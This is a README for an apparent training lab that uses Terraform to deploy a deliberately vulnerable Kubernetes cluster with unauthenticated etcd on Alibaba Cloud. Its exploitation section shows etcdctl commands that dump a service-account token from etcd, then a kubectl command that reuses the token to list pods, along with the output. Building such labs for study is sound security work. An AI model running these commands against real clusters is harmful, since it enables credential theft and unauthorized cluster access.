# kubernetes etcd unauth Vulnerable Environment

English | [中文](./README_CN.md)

## Description

This is a scenario used to build the kubernetes etcd unauth vulnerability environment.

After building the environment with Terraform, users can obtain api object resource on kubernetes cluster through the etcd unauth vulnerabilities.

## Deployment Environment

Execute the following command in the container

```shell
cd /TerraformGoat/kubernetes/etcd/unauth
```

Configure Alibaba Cloud Access Credentials

```shell
export ALICLOUD_ACCESS_KEY="LTAI5tFkmNGXXXXXXXXX"
export ALICLOUD_SECRET_KEY="ORBs2lulAHDXXXXXXXXX"
export ALICLOUD_REGION="cn-beijing"
```

> You can create and view your AccessKey on the [AccessKey page](https://ram.console.aliyun.com/manage/ak) of the Alibaba Cloud console

Deploy Vulnerable Environment

```shell
terraform init
terraform apply
```

> When the terminal prompts `Enter a value:`, enter `yes`

![img](../../../images/20220622-174141.jpg)

After the environment is set up, You can see the etcd access address of the scenario at Outputs.

## Vulnerability Utilization

we can use "etcdctl" tool to read secrets on kubernetes cluster.

for example, get "deployment controller" token

```shell
➜  unauth git:(main) ✗ etcdctl --endpoints="http://39.96.163.182:2379" get / --prefix --keys-only|grep secrets
...
/registry/secrets/kube-system/deployment-controller-token-klbtj
...
➜  unauth git:(main) ✗ etcdctl --endpoints="http://39.96.163.182:2379" get /registry/secrets/kube-system/deployment-controller-token-klbtj
...
token�eyJhbGciOiJSUzI1NiIsImtpZCI6Im93R3VfUk1vcHRpakg3T2xZVkNuODVIYTg3eXlzYWprYU1ub2hWSUhSNXcifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJkZXBsb3ltZW50LWNvbnRyb2xsZXItdG9rZW4ta2xidGoiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoiZGVwbG95bWVudC1jb250cm9sbGVyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQudWlkIjoiMDEyM2U0M2YtYWY4NS00NTAxLWIyZDItNDUxNjc1ZWEzMTcyIiwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50Omt1YmUtc3lzdGVtOmRlcGxveW1lbnQtY29udHJvbGxlciJ9.oUUcnRPq1Rc3HttQsS3HBarzmAfIZk4YrmmJ0ARjYG2LwIp_hQbVQBZ0crKdsL10nXjV9MmLIPB9jFxVmUHhifc054cQ5H0e5yKQv7rlQxbNSIZo2s9nYgMql5DrEaQ9aocyzGlZVG8Z5aWFHEjduPCQKeCvBoQfuTyBrqBAqZP-zWYYIFLrYxKOyFICqDTNe0GKA3MxXeMrpp2S1ijg29WflZ_fTXJbY6iVISnT9oUFuw6uoIatYvNZXIsCfXqwAN4TPmEX4_joezLCKQH9iUCGutHpiyTXJpd3Ry8x66ziVu9JFzoOjpHJCyOmo-hT-eV5TD6UBxeg9UEQzZqwTA#kubernetes.io/service-account-token
```

then use "deployment controller" token to access kube-apiserver, such as query pod resources

```shell
➜  unauth git:(main) ✗  kubectl --insecure-skip-tls-verify=true --server="https://39.96.163.182:6443" --token="eyJhbGciOiJSUzI1NiIsImtpZCI6Im93R3VfUk1vcHRpakg3T2xZVkNuODVIYTg3eXlzYWprYU1ub2hWSUhSNXcifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJkZXBsb3ltZW50LWNvbnRyb2xsZXItdG9rZW4ta2xidGoiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoiZGVwbG95bWVudC1jb250cm9sbGVyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQudWlkIjoiMDEyM2U0M2YtYWY4NS00NTAxLWIyZDItNDUxNjc1ZWEzMTcyIiwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50Omt1YmUtc3lzdGVtOmRlcGxveW1lbnQtY29udHJvbGxlciJ9.oUUcnRPq1Rc3HttQsS3HBarzmAfIZk4YrmmJ0ARjYG2LwIp_hQbVQBZ0crKdsL10nXjV9MmLIPB9jFxVmUHhifc054cQ5H0e5yKQv7rlQxbNSIZo2s9nYgMql5DrEaQ9aocyzGlZVG8Z5aWFHEjduPCQKeCvBoQfuTyBrqBAqZP-zWYYIFLrYxKOyFICqDTNe0
GKA3MxXeMrpp2S1ijg29WflZ_fTXJbY6iVISnT9oUFuw6uoIatYvNZXIsCfXqwAN4TPmEX4_joezLCKQH9iUCGutHpiyTXJpd3Ry8x66ziVu9JFzoOjpHJCyOmo-hT-eV5TD6UBxeg9UEQzZqwTA" get pods -A

NAMESPACE     NAME                                              READY   STATUS    RESTARTS   AGE
kube-system   coredns-5495dd7c88-kb7vh                          0/1     Pending   0          18m
kube-system   coredns-5495dd7c88-lwkpr                          0/1     Pending   0          18m
kube-system   kube-apiserver-iz2zeh6di9zn4ff2qvgh8jz            1/1     Running   0          17m
kube-system   kube-controller-manager-iz2zeh6di9zn4ff2qvgh8jz   1/1     Running   1          19m
kube-system   kube-proxy-pgrtj                                  1/1     Running   0          18m
kube-system   kube-scheduler-iz2zeh6di9zn4ff2qvgh8jz            1/1     Running   1          19m
```

## Destroy the environment

```shell
terraform destroy
```
